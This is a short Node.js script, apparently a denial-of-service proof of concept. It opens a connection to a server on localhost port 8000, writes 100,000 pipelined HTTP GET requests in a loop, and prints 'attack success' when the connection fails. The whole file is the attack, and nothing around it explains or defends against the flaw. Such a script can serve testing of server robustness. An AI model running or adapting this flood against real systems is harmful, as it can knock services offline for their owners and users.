var net = require('net');
var attack_str = 'GET / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n';
var i = 100000;

var client = net.connect({port: 8000, host: '127.0.0.1'}, function() {
    while(i--) {
        client.write(attack_str);
    }
});

client.on('error', function(e) {
    console.log('attack success');
});